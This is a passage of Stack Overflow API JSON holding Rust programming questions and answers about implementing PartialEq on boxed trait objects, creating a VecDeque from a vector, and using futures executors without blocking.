noreferrer\">playground</a>. I cannot write full answer now, so feel free to write your own."}], "answers": [{"comments": [{"owner": {"reputation": 3312, "user_id": 342327, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/8fd5badb01bbc9389476e9394ab6607e?s=128&d=identicon&r=PG", "display_name": "snim2", "link": "https://stackoverflow.com/users/342327/snim2"}, "edited": false, "score": 0, "creation_date": 1519476940, "post_id": 48961453, "comment_id": 84931967, "body": "Interesting, many thanks. I implemented the answer in the comment (on the question) from @red75prime, which doesn&#39;t require <code>Sized</code> or <code>TypeId</code>. It seems to work OK, except that in the &quot;real&quot; code I couldn&#39;t persuade Rust to derive <code>PartialEq</code> on <code>ActionList</code> automatically, but a simple manual implementation is fine. I haven&#39;t seen <code>specialization</code> before. In the real code, each <code>ApplyAction</code> struct has a method which does need to be different for each impl, can <code>specialization</code> still be used in that case?"}, {"owner": {"reputation": 4594, "user_id": 1478356, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/996ee463b8f6b17a738f2e23f7ecfe9f?s=128&d=identicon&r=PG", "display_name": "Stefan", "link": "https://stackoverflow.com/users/1478356/stefan"}, "reply_to_user": {"reputation": 3312, "user_id": 342327, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/8fd5badb01bbc9389476e9394ab6607e?s=128&d=identicon&r=PG", "display_name": "snim2", "link": "https://stackoverflow.com/users/342327/snim2"}, "edited": false, "score": 1, "creation_date": 1519477976, "post_id": 48961453, "comment_id": 84932258, "body": "No, if you need different code you can&#39;t use <code>specialization</code>. The example from @red75prime doesn&#39;t explicitly use <code>Sized</code>, but you probably shouldn&#39;t call <code>impl_comparable_for!</code> for unsized types.  Also it&#39;s working around the coerce <code>&amp;T</code> into <code>&amp;Any</code> by providing a trait method that does it (which is a fine workaround afaict)."}], "tags": [], "owner": {"reputation": 4594, "user_id": 1478356, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/996ee463b8f6b17a738f2e23f7ecfe9f?s=128&d=identicon&r=PG", "display_name": "Stefan", "link": "https://stackoverflow.com/users/1478356/stefan"}, "is_accepted": true, "score": 1, "last_activity_date": 1519465981, "last_edit_date": 1519465981, "creation_date": 1519465467, "answer_id": 48961453, "question_id": 48952627, "link": "https://stackoverflow.com/questions/48952627/implementing-partialeq-on-a-boxed-trait/48961453#48961453", "title": "Implementing PartialEq on a boxed trait", "body": "<p>In the <code>impl&lt;...&gt; PartialEq for ApplyAction&lt;T&gt;</code> you used <code>TypeId::of::&lt;Self&gt;()</code>; i.e. the type of the unsized trait object.  That isn't what you wanted; but remove the <code>if</code> and directly call <code>self.is_eq(other)</code>, and your code should be working.</p>\n\n<p>Sadly your example requires a lot of code to implement <code>ApplyAction&lt;T&gt; for MyAction&lt;T&gt;</code> - and again for each other action type you might want to use.</p>\n\n<p>I tried to remove that overhead, and with nightly features it is completely gone (and otherwise only a small stub remains):</p>\n\n<p><a href=\"https://play.rust-lang.org/?gist=64595c2e85bd3877b94af7f37d7c77d6&amp;version=nightly\" rel=\"nofollow noreferrer\">Playground</a></p>\n\n<pre><code>// see `default impl` below\n#![feature(specialization)]\n\n// Any::&lt;T&gt;::downcast_ref only works for special trait objects (`Any` and\n// `Any + Send`); having a trait `T` derive from `Any` doesn't allow you to\n// coerce (\"cast\") `&amp;T` into `&amp;Any` (that might change in the future).\n//\n// Implementing a custom `downcast_ref` which takes any\n// `T: Any + ?Sized + 'static` as input leads to another problem: if `T` is a\n// trait that didn't inherit `Any` you still can call `downcast_ref`, but it\n// won't work (it will use the `TypeId` of the trait object instead of the\n// underlying (sized) type).\n//\n// Use `SizedAny` instead: it's only implemented for sized types by default;\n// that prevents the problem above, and we can implement `downcast_ref` without\n// worrying.\n\nmod sized_any {\n    use std::any::TypeId;\n\n    // don't allow other implementations of `SizedAny`; `SizedAny` must only be\n    // implemented for sized types.\n    mod seal {\n        // it must be a `pub trait`, but not be reachable - hide it in\n        // private mod.\n        pub trait Seal {}\n    }\n\n    pub trait SizedAny: seal::Seal + 'static {\n        fn get_type_id(&amp;self) -&gt; TypeId {\n            TypeId::of::&lt;Self&gt;()\n        }\n    }\n\n    impl&lt;T: 'static&gt; seal::Seal for T {}\n    impl&lt;T: 'static&gt; SizedAny for T {}\n\n    // `SizedAny + ?Sized` means it can be a trait object, but `SizedAny` was\n    // implemented for the underlying sized type.\n    pub fn downcast_ref&lt;From, To&gt;(v: &amp;From) -&gt; Option&lt;&amp;To&gt;\n    where\n        From: SizedAny + ?Sized + 'static,\n        To: 'static,\n    {\n        if TypeId::of::&lt;To&gt;() == &lt;From as SizedAny&gt;::get_type_id(v) {\n            Some(unsafe { &amp;*(v as *const From as *const To) })\n        } else {\n            None\n        }\n    }\n}\nuse sized_any::*;\n\nuse std::boxed::Box;\nuse std::fmt;\n\n// `ApplyAction`\n\nfn foreign_eq&lt;T, U&gt;(a: &amp;T, b: &amp;U) -&gt; bool\nwhere\n    T: PartialEq + 'static,\n    U: SizedAny + ?Sized + 'static,\n{\n    if let Some(b) = downcast_ref::&lt;U, T&gt;(b) {\n        a == b\n    } else {\n        false\n    }\n}\n\npub trait ApplyAction&lt;T: 'static&gt;: fmt::Debug + SizedAny + 'static {\n    fn foreign_eq(&amp;self, other: &amp;ApplyAction&lt;T&gt;) -&gt; bool;\n}\n\n// requires `#![feature(specialization)]` and a nightly compiler.\n// could also copy the default implementation manually to each `impl` instead.\n//\n// this implementation only works with sized `A` types; we cannot make \n// `ApplyAction&lt;T&gt;` inherit `Sized`, as that would destroy object safety.\ndefault impl&lt;T: 'static, A: PartialEq + 'static&gt; ApplyAction&lt;T&gt; for A {\n    fn foreign_eq(&amp;self, other: &amp;ApplyAction&lt;T&gt;) -&gt; bool {\n        foreign_eq(self, other)\n    }\n}\n\nimpl&lt;T: 'static&gt; PartialEq for ApplyAction&lt;T&gt; {\n    fn eq(&amp;self, other: &amp;ApplyAction&lt;T&gt;) -&gt; bool {\n        self.foreign_eq(other)\n    }\n}\n\n// `MyAction`\n\n#[derive(Debug, Eq, PartialEq)]\npub struct MyAction&lt;T: fmt::Debug&gt; {\n    label: T,\n}\n\nimpl&lt;T: fmt::Debug&gt; MyAction&lt;T&gt; {\n    pub fn new(label: T) -&gt; MyAction&lt;T&gt; {\n        MyAction { label: label }\n    }\n}\n\nimpl&lt;T: fmt::Debug + PartialEq + 'static&gt; ApplyAction&lt;T&gt; for MyAction&lt;T&gt; {}\n\n// `ActionList`\n\n#[derive(Debug)]\npub struct ActionList&lt;T&gt; {\n    actions: Vec&lt;Box&lt;ApplyAction&lt;T&gt;&gt;&gt;,\n}\n\nimpl&lt;T: 'static&gt; ActionList&lt;T&gt; {\n    pub fn new() -&gt; ActionList&lt;T&gt; {\n        ActionList { actions: vec![] }\n    }\n\n    pub fn push&lt;A: ApplyAction&lt;T&gt; + 'static&gt;(&amp;mut self, action: A) {\n        self.actions.push(Box::&lt;A&gt;::new(action));\n    }\n}\n\nimpl&lt;T: 'static&gt; PartialEq for ActionList&lt;T&gt; {\n    fn eq(&amp;self, other: &amp;ActionList&lt;T&gt;) -&gt; bool {\n        if self.actions.len() != other.actions.len() {\n            return false;\n        }\n        for (i, action) in self.actions.iter().enumerate() {\n            if **action != *other.actions[i] {\n                return false;\n            }\n        }\n        true\n    }\n}\n\n// `main`\n\nfn main() {\n    let mut script1: ActionList&lt;String&gt; = ActionList::new();\n    script1.push(MyAction::new(\"foo\".to_string()));\n    let mut script2: ActionList&lt;String&gt; = ActionList::new();\n    script2.push(MyAction::new(\"foo\".to_string()));\n    let mut script3: ActionList&lt;String&gt; = ActionList::new();\n    script3.push(MyAction::new(\"bar\".to_string()));\n    assert_eq!(script1, script2);\n    assert_ne!(script1, script3);\n}\n</code></pre>\n\n<p>See also:</p>\n\n<ul>\n<li><a href=\"https://doc.rust-lang.org/reference/items/traits.html#object-safety\" rel=\"nofollow noreferrer\">Object Safety</a></li>\n</ul>\n"}], "owner": {"reputation": 3312, "user_id": 342327, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/8fd5badb01bbc9389476e9394ab6607e?s=128&d=identicon&r=PG", "display_name": "snim2", "link": "https://stackoverflow.com/users/342327/snim2"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 998, "favorite_count": 1, "accepted_answer_id": 48961453, "answer_count": 1, "score": 8, "last_activity_date": 1519465981, "creation_date": 1519404516, "question_id": 48952627, "link": "https://stackoverflow.com/questions/48952627/implementing-partialeq-on-a-boxed-trait", "title": "Implementing PartialEq on a boxed trait", "body": "<p>I have a Rust program which contains a number of different structs which all implement a trait called <code>ApplyAction</code>. Another struct, <code>ActionList</code>, contains a vector of boxed objects which implement <code>ApplyAction</code>. I would like to create some unit tests which compare <code>ActionList</code>s with one another. </p>\n\n<p>There are a few different SO questions which deal with <code>PartialEq</code> on boxed traits, and I've used these to get some way towards an implementation. However, in the (simplified) code below (and on the <a href=\"https://play.rust-lang.org/?gist=4915eeef286b49634fec8cfe940691f9&amp;version=stable\" rel=\"noreferrer\">Playground</a>), the assertions in <code>main()</code> fail because the type ids of the objects passed to <code>eq()</code> differ. Why?</p>\n\n<p>Also, this seems extremely complicated for such a simple use case -- is there an easier way to do this?</p>\n\n<pre><code>use std::any::TypeId;\nuse std::boxed::Box;\nuse std::fmt;\nuse std::mem::transmute;\n\n#[derive(Debug, Eq, PartialEq)]\npub struct MyAction&lt;T: fmt::Debug&gt; {\n    label: T,\n}\n\nimpl&lt;T: fmt::Debug&gt; MyAction&lt;T&gt; {\n    pub fn new(label: T) -&gt; MyAction&lt;T&gt; {\n        MyAction { label: label }\n    }\n}\n\npub trait ApplyAction&lt;T: fmt::Debug + PartialEq&gt;: fmt::Debug {\n    fn get_type(&amp;self) -&gt; TypeId;\n    fn is_eq(&amp;self, other: &amp;ApplyAction&lt;T&gt;) -&gt; bool;\n}\n\nimpl&lt;T: fmt::Debug + Eq + 'static&gt; ApplyAction&lt;T&gt; for MyAction&lt;T&gt; {\n    fn get_type(&amp;self) -&gt; TypeId {\n        TypeId::of::&lt;MyAction&lt;T&gt;&gt;()\n    }\n\n    fn is_eq(&amp;self, other: &amp;ApplyAction&lt;T&gt;) -&gt; bool {\n        if other.get_type() == TypeId::of::&lt;Self&gt;() {\n            // Rust thinks that self and other are different types in the calls below.\n            let other_ = unsafe { *transmute::&lt;&amp;&amp;ApplyAction&lt;T&gt;, &amp;&amp;Self&gt;(&amp;other) };\n            self.label == other_.label\n        } else {\n            false\n        }\n    }\n}\n\nimpl&lt;T: fmt::Debug + Eq + PartialEq + 'static&gt; PartialEq for ApplyAction&lt;T&gt; {\n    fn eq(&amp;self, other: &amp;ApplyAction&lt;T&gt;) -&gt; bool {\n        if other.get_type() == TypeId::of::&lt;Self&gt;() {\n            self.is_eq(other)\n        } else {\n            false\n        }\n    }\n}\n\n#[derive(Debug)]\npub struct ActionList&lt;T: fmt::Debug&gt; {\n    actions: Vec&lt;Box&lt;ApplyAction&lt;T&gt;&gt;&gt;,\n}\n\nimpl&lt;T: fmt::Debug + PartialEq&gt; ActionList&lt;T&gt; {\n    pub fn new() -&gt; ActionList&lt;T&gt; {\n        ActionList { actions: vec![] }\n    }\n    pub fn push&lt;A: ApplyAction&lt;T&gt; + 'static&gt;(&amp;mut self, action: A) {\n        self.actions.push(Box::new(action));\n    }\n}\n\nimpl&lt;T: fmt::Debug + Eq + PartialEq + 'static&gt; PartialEq for ActionList&lt;T&gt; {\n    fn eq(&amp;self, other: &amp;ActionList&lt;T&gt;) -&gt; bool {\n        for (i, action) in self.actions.iter().enumerate() {\n            if **action != *other.actions[i] {\n                return false;\n            }\n        }\n        true\n    }\n}\n\nfn main() {\n    let mut script1: ActionList&lt;String&gt; = ActionList::new();\n    script1.push(MyAction::new(\"foo\".to_string()));\n    let mut script2: ActionList&lt;String&gt; = ActionList::new();\n    script2.push(MyAction::new(\"foo\".to_string()));\n    let mut script3: ActionList&lt;String&gt; = ActionList::new();\n    script3.push(MyAction::new(\"bar\".to_string()));\n    assert_eq!(script1, script2);\n    assert_ne!(script1, script3);\n}\n</code></pre>\n"}, {"tags": ["vector", "rust"], "answers": [{"comments": [{"owner": {"reputation": 1526, "user_id": 2741954, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d9f910e8a6cae81f057b6ce881ca4337?s=128&d=identicon&r=PG&f=1", "display_name": "Simon Brahan", "link": "https://stackoverflow.com/users/2741954/simon-brahan"}, "edited": false, "score": 1, "creation_date": 1519394268, "post_id": 48949075, "comment_id": 84905167, "body": "That&#39;s great, thanks. After reading your explanation, I found I could also do <code>let ring = VecDeque::from(vec![1, 2, 3]);</code> without having an extra <code>use</code> statement. Are there any problems with this approach?"}, {"owner": {"reputation": 478030, "user_id": 279627, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/2dceea858ad8f1577bec6ddaa0485d15?s=128&d=identicon&r=PG", "display_name": "Sven Marnach", "link": "https://stackoverflow.com/users/279627/sven-marnach"}, "reply_to_user": {"reputation": 1526, "user_id": 2741954, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d9f910e8a6cae81f057b6ce881ca4337?s=128&d=identicon&r=PG&f=1", "display_name": "Simon Brahan", "link": "https://stackoverflow.com/users/2741954/simon-brahan"}, "edited": false, "score": 0, "creation_date": 1519395745, "post_id": 48949075, "comment_id": 84906205, "body": "@SimonBrahan Not really \u2013 it will do more heap allocations than the from_iter approach, but that&#39;s unlikely to be relevant.  But why would you want to avoid the additional <code>use</code> statement?  It doesn&#39;t hurt in any way."}, {"owner": {"reputation": 25893, "user_id": 353820, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/32b29e1dc23c2c5abe0283ab7b9541d3?s=128&d=identicon&r=PG", "display_name": "Doug", "link": "https://stackoverflow.com/users/353820/doug"}, "reply_to_user": {"reputation": 1526, "user_id": 2741954, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d9f910e8a6cae81f057b6ce881ca4337?s=128&d=identicon&r=PG&f=1", "display_name": "Simon Brahan", "link": "https://stackoverflow.com/users/2741954/simon-brahan"}, "edited": false, "score": 0, "creation_date": 1519396376, "post_id": 48949075, "comment_id": 84906641, "body": "@SimonBrahan Nope; they&#39;re technically different, but practically speaking <code>Vec</code> is used pervasively through out all rust code. Do whichever feels more ergonomic to you."}, {"owner": {"reputation": 126, "user_id": 1558582, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/838fc282823b5c65a2b3f368377a1cf0?s=128&d=identicon&r=PG", "display_name": "Jonah", "link": "https://stackoverflow.com/users/1558582/jonah"}, "edited": false, "score": 0, "creation_date": 1554495238, "post_id": 48949075, "comment_id": 97788698, "body": "...but this only works because integers are <code>Copy</code>, right?"}, {"owner": {"reputation": 17608, "user_id": 3650362, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Fqdi1.jpg?s=128&g=1", "display_name": "trentcl", "link": "https://stackoverflow.com/users/3650362/trentcl"}, "edited": false, "score": 4, "creation_date": 1576423012, "post_id": 48949075, "comment_id": 104886867, "body": "This is a bad answer. It creates a <code>VecDeque&lt;&amp;&#39;static i32&gt;</code> instead of <code>VecDeque&lt;i32&gt;</code>. Also, the most usual way to use <code>FromIterator</code> is with <code>Iterator::collect</code>, which doesn&#39;t need to be <code>use</code>d. <code>let ring: VecDeque&lt;_&gt; = [1, 2, 3].iter().copied().collect();</code> would be a much more reasonable interpretation of the code in the question."}], "tags": [], "owner": {"reputation": 25893, "user_id": 353820, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/32b29e1dc23c2c5abe0283ab7b9541d3?s=128&d=identicon&r=PG", "display_name": "Doug", "link": "https://stackoverflow.com/users/353820/doug"}, "is_accepted": true, "score": 7, "last_activity_date": 1519494789, "last_edit_date": 1519494789, "creation_date": 1519392873, "answer_id": 48949075, "question_id": 48948836, "link": "https://stackoverflow.com/questions/48948836/how-do-i-create-a-vecdeque-from-a-vector/48949075#48949075", "title": "How do I create a VecDeque from a vector?", "body": "<pre><code>use std::collections::VecDeque;\nuse std::iter::FromIterator;\nfn main() {\n    let ring = VecDeque::from_iter(&amp;[1, 2, 3]);\n    println!(\"{:?}\", ring);\n}\n</code></pre>\n\n<p>It only implements <code>From&lt;Vec&lt;T&gt;&gt;</code> and <code>[...]</code> isn't a <code>Vec</code>. Since it implements <code>FromIterator</code>, you can use any kind of iterator as a source with <code>from_iter</code>. <code>&amp;[1, 2, 3]</code> is because <code>from_iter</code> takes an <code>Iterator</code>.</p>\n"}, {"tags": [], "owner": {"reputation": 23772, "user_id": 1035008, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/afa583c070c82a0961be918141f953fe?s=128&d=identicon&r=PG", "display_name": "Yuchen", "link": "https://stackoverflow.com/users/1035008/yuchen"}, "is_accepted": false, "score": 7, "last_activity_date": 1576423055, "last_edit_date": 1592644375, "creation_date": 1576421180, "answer_id": 59344980, "question_id": 48948836, "link": "https://stackoverflow.com/questions/48948836/how-do-i-create-a-vecdeque-from-a-vector/59344980#59344980", "title": "How do I create a VecDeque from a vector?", "body": "<p>Alternatively, you can also use <a href=\"https://doc.rust-lang.org/std/collections/struct.VecDeque.html#impl-From%3CVec%3CT%3E%3E\" rel=\"nofollow noreferrer\"><code>From&lt;Vec&lt;T&gt;&gt;</code></a>:</p>\n<blockquote>\n<pre><code>fn from(other: Vec&lt;T&gt;) -&gt; VecDeque&lt;T&gt;\n</code></pre>\n<p>Turn a <code>Vec&lt;T&gt;</code> into a <code>VecDeque&lt;T&gt;</code>.</p>\n<p>This avoids reallocating where possible, but the conditions for that are strict, and subject to change, and so shouldn't be relied upon unless the <code>Vec&lt;T&gt;</code> came from <code>From&lt;VecDeque&lt;T&gt;&gt;</code> and hasn't been reallocated.</p>\n</blockquote>\n<p>Example:</p>\n<pre><code>let vector: Vec&lt;i32&gt; = vec![0, 1, 2];\nlet vec_queue: VecDeque&lt;i32&gt; = VecDeque::from(vector);\n</code></pre>\n"}], "owner": {"reputation": 1526, "user_id": 2741954, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d9f910e8a6cae81f057b6ce881ca4337?s=128&d=identicon&r=PG&f=1", "display_name": "Simon Brahan", "link": "https://stackoverflow.com/users/2741954/simon-brahan"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2949, "favorite_count": 0, "accepted_answer_id": 48949075, "answer_count": 2, "score": 7, "last_activity_date": 1576423055, "creation_date": 1519392072, "last_edit_date": 1519494675, "question_id": 48948836, "link": "https://stackoverflow.com/questions/48948836/how-do-i-create-a-vecdeque-from-a-vector", "title": "How do I create a VecDeque from a vector?", "body": "<p>I am trying to quickly create a <code>VecDeque</code> using the <code>::from()</code>. I have the following Rust code:</p>\n\n<pre><code>use std::collections::VecDeque;\n\nfn main() {\n    let ring = VecDeque::from([1, 2, 3]);\n    println!(\"{:?}\", ring);\n}\n</code></pre>\n\n<p>I get the following compiler error:</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>error[E0277]: the trait bound `std::collections::VecDeque&lt;_&gt;: std::convert::From&lt;[{integer}; 3]&gt;` is not satisfied\n --&gt; src/main.rs:4:16\n  |\n4 |     let ring = VecDeque::from([1, 2, 3]);\n  |                ^^^^^^^^^^^^^^ the trait `std::convert::From&lt;[{integer}; 3]&gt;` is not implemented for `std::collections::VecDeque&lt;_&gt;`\n  |\n  = help: the following implementations were found:\n            &lt;std::collections::VecDeque&lt;T&gt; as std::convert::From&lt;std::vec::Vec&lt;T&gt;&gt;&gt;\n  = note: required by `std::convert::From::from`\n</code></pre>\n\n<p>This looks like the <code>VecDeque</code> collection doesn't implement the <code>from</code> trait, but  <a href=\"https://doc.rust-lang.org/std/collections/struct.VecDeque.html#implementations\" rel=\"noreferrer\">the docs</a> suggest that it does. What am I doing wrong?</p>\n"}, {"tags": ["rust"], "comments": [{"owner": {"reputation": 134258, "user_id": 785065, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/qAbxM.jpg?s=128&g=1", "display_name": "loganfsmyth", "link": "https://stackoverflow.com/users/785065/loganfsmyth"}, "edited": false, "score": 0, "creation_date": 1519358707, "post_id": 48940634, "comment_id": 84888829, "body": "It might help if you expand on why you want to use <code>.poll</code> instead of blocking with <code>.wait</code>. Generally the idea with a future would be to avoid polling constantly to see if it is done."}, {"owner": {"reputation": 25893, "user_id": 353820, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/32b29e1dc23c2c5abe0283ab7b9541d3?s=128&d=identicon&r=PG", "display_name": "Doug", "link": "https://stackoverflow.com/users/353820/doug"}, "reply_to_user": {"reputation": 134258, "user_id": 785065, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/qAbxM.jpg?s=128&g=1", "display_name": "loganfsmyth", "link": "https://stackoverflow.com/users/785065/loganfsmyth"}, "edited": false, "score": 0, "creation_date": 1519362328, "post_id": 48940634, "comment_id": 84889737, "body": "@loganfsmyth Well, how do you do that without <code>poll</code>? <code>thread::spawn(|| { x.wait(); })</code>? I thought this was the problem an executor was supposed to solve. I&#39;m happy to do it another way if there&#39;s some other way of doing it. All I want is not to block the current thread."}, {"owner": {"reputation": 25893, "user_id": 353820, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/32b29e1dc23c2c5abe0283ab7b9541d3?s=128&d=identicon&r=PG", "display_name": "Doug", "link": "https://stackoverflow.com/users/353820/doug"}, "reply_to_user": {"reputation": 134258, "user_id": 785065, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/qAbxM.jpg?s=128&g=1", "display_name": "loganfsmyth", "link": "https://stackoverflow.com/users/785065/loganfsmyth"}, "edited": false, "score": 0, "creation_date": 1519362423, "post_id": 48940634, "comment_id": 84889763, "body": "I thought I read something recently about an executor that multiplexes all the tasks assigned to it over a single thread, but I can&#39;t find it now?"}, {"owner": {"reputation": 134258, "user_id": 785065, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/qAbxM.jpg?s=128&g=1", "display_name": "loganfsmyth", "link": "https://stackoverflow.com/users/785065/loganfsmyth"}, "edited": false, "score": 0, "creation_date": 1519363721, "post_id": 48940634, "comment_id": 84890142, "body": "Whatever code that needs the value <code>v</code> can be triggered from <i>inside</i> your <code>.then</code> callback for instance. Instead of doing <code>.poll</code> to try to get the value, you can do <code>.wait</code> and then right where you have <code>println!(&quot;GOT: {:?}&quot;, v);</code>, just do whatever operation you wanted to do with <code>v</code> there."}, {"owner": {"reputation": 25893, "user_id": 353820, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/32b29e1dc23c2c5abe0283ab7b9541d3?s=128&d=identicon&r=PG", "display_name": "Doug", "link": "https://stackoverflow.com/users/353820/doug"}, "reply_to_user": {"reputation": 134258, "user_id": 785065, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/qAbxM.jpg?s=128&g=1", "display_name": "loganfsmyth", "link": "https://stackoverflow.com/users/785065/loganfsmyth"}, "edited": false, "score": 0, "creation_date": 1519367313, "post_id": 48940634, "comment_id": 84891296, "body": "I don&#39;t really understand how what you&#39;re suggesting avoids blocking the current thread. Could you post an actual example of how this would work? (If I wanted to block the main thread, I would just use a synchronous function; how is what you&#39;re suggesting any different to that?)"}, {"owner": {"reputation": 134258, "user_id": 785065, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/qAbxM.jpg?s=128&g=1", "display_name": "loganfsmyth", "link": "https://stackoverflow.com/users/785065/loganfsmyth"}, "edited": false, "score": 1, "creation_date": 1519368776, "post_id": 48940634, "comment_id": 84891896, "body": "I think it&#39;s hard to talk about because your snippet only has the one future, so there&#39;s nothing else to block that would effect anything. Perhaps an expanded example that illustrates something being blocked causing a problem would help? At the end of the day, it is an executor&#39;s job to block, because it is the synchronous blocking value that basically owns the execution of all of the tasks it manages. So if you use Tokio it&#39;s still blocking: <a href=\"https://play.rust-lang.org/?gist=f96d5a5c2f1a258149b705cda7300846&amp;version=stable\" rel=\"nofollow noreferrer\">play.rust-lang.org/&hellip;</a>"}, {"owner": {"reputation": 25893, "user_id": 353820, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/32b29e1dc23c2c5abe0283ab7b9541d3?s=128&d=identicon&r=PG", "display_name": "Doug", "link": "https://stackoverflow.com/users/353820/doug"}, "reply_to_user": {"reputation": 134258, "user_id": 785065, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/qAbxM.jpg?s=128&g=1", "display_name": "loganfsmyth", "link": "https://stackoverflow.com/users/785065/loganfsmyth"}, "edited": false, "score": 0, "creation_date": 1519371532, "post_id": 48940634, "comment_id": 84893020, "body": "I&#39;m not sure what to say. Please post an answer to the question if you have one. Your snippet still blocks the current thread, making it neither an answer to my question nor a solution to my problem."}, {"owner": {"reputation": 134258, "user_id": 785065, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/qAbxM.jpg?s=128&g=1", "display_name": "loganfsmyth", "link": "https://stackoverflow.com/users/785065/loganfsmyth"}, "edited": false, "score": 1, "creation_date": 1519371877, "post_id": 48940634, "comment_id": 84893178, "body": "My point is, without understanding why avoiding blocking the main thread is a goal of yours, it&#39;s not clear that any given answer would be the correct one for your usecase. If you&#39;re not blocking the main thread, are you planning to have a loop in your own code to constantly poll? What is driving this polling if you&#39;re doing that instead of blocking? If an future will take an unknown amount of time, it&#39;s not really efficient to spend the whole time checking to see if it is done, for instance."}, {"owner": {"reputation": 25893, "user_id": 353820, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/32b29e1dc23c2c5abe0283ab7b9541d3?s=128&d=identicon&r=PG", "display_name": "Doug", "link": "https://stackoverflow.com/users/353820/doug"}, "reply_to_user": {"reputation": 134258, "user_id": 785065, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/qAbxM.jpg?s=128&g=1", "display_name": "loganfsmyth", "link": "https://stackoverflow.com/users/785065/loganfsmyth"}, "edited": false, "score": 0, "creation_date": 1519372104, "post_id": 48940634, "comment_id": 84893281, "body": "<i>Please post an answer</i> to the question if you have one: this isn&#39;t an open discussion forum; my code and question are quite specific."}, {"owner": {"reputation": 134258, "user_id": 785065, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/qAbxM.jpg?s=128&g=1", "display_name": "loganfsmyth", "link": "https://stackoverflow.com/users/785065/loganfsmyth"}, "edited": false, "score": 0, "creation_date": 1519372654, "post_id": 48940634, "comment_id": 84893508, "body": "There are not realistically enough details to answer this in a meaningful way."}, {"owner": {"reputation": 25893, "user_id": 353820, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/32b29e1dc23c2c5abe0283ab7b9541d3?s=128&d=identicon&r=PG", "display_name": "Doug", "link": "https://stackoverflow.com/users/353820/doug"}, "reply_to_user": {"reputation": 134258, "user_id": 785065, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/qAbxM.jpg?s=128&g=1", "display_name": "loganfsmyth", "link": "https://stackoverflow.com/users/785065/loganfsmyth"}, "edited": false, "score": 0, "creation_date": 1519372749, "post_id": 48940634, "comment_id": 84893546, "body": "@loganfsmyth that is clearly false. Are there <i>any</i> concrete implementations of Executor? Obviously the answer is yes. How do I use done? My question is not unclear or unspecific in any way."}, {"owner": {"reputation": 25893, "user_id": 353820, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/32b29e1dc23c2c5abe0283ab7b9541d3?s=128&d=identicon&r=PG", "display_name": "Doug", "link": "https://stackoverflow.com/users/353820/doug"}, "edited": false, "score": 0, "creation_date": 1519373027, "post_id": 48940634, "comment_id": 84893661, "body": "I feel like you&#39;re being  <i>incredibly unhelpful</i> here. Last time I posted a question here, I was told off for not being specific enough and asked to change it to be a code sample. This time, I post a code sample and I&#39;m told oh, I don&#39;t understand &#39;why you&#39;re trying to do that&#39;, and I have to post a supporting essay to explain why I&#39;m trying to write this code. :("}, {"owner": {"reputation": 134258, "user_id": 785065, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/qAbxM.jpg?s=128&g=1", "display_name": "loganfsmyth", "link": "https://stackoverflow.com/users/785065/loganfsmyth"}, "edited": false, "score": 0, "creation_date": 1519373186, "post_id": 48940634, "comment_id": 84893727, "body": "I promise I&#39;m only trying to help answer your question. The point is, executors block. If they didn&#39;t, then they couldn&#39;t do their job efficiently. The only way to have one that doesn&#39;t block would be to implement your own essentially that blocked some of the time, but also allowed whatever other main thread stuff you want to happen to happen."}, {"owner": {"reputation": 25893, "user_id": 353820, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/32b29e1dc23c2c5abe0283ab7b9541d3?s=128&d=identicon&r=PG", "display_name": "Doug", "link": "https://stackoverflow.com/users/353820/doug"}, "edited": false, "score": 0, "creation_date": 1519373218, "post_id": 48940634, "comment_id": 84893742, "body": "Fine, I don&#39;t care. Let it block. <i>how do I get an Executor?</i>"}, {"owner": {"reputation": 4594, "user_id": 1478356, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/996ee463b8f6b17a738f2e23f7ecfe9f?s=128&d=identicon&r=PG", "display_name": "Stefan", "link": "https://stackoverflow.com/users/1478356/stefan"}, "edited": false, "score": 0, "creation_date": 1519373477, "post_id": 48940634, "comment_id": 84893831, "body": "@Doug so did you take a look at the playground example from loganfsmyth with tokio?"}, {"owner": {"reputation": 134258, "user_id": 785065, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/qAbxM.jpg?s=128&g=1", 